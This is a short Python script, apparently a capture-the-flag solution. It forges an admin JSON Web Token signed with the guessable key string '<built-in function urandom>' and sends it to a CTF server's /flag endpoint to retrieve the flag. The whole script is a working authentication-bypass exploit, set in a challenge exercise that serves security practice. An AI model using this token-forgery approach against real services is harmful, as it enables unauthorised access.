#!/usr/bin/env python3
import requests
import jwt
import json

a = jwt.encode({'user': "admin"}, "<built-in function urandom>", "HS256")
r = requests.get(f"http://ctf-metared.ua.pt:2000/flag?token={a}")
print(json.loads(r.text)['message'])


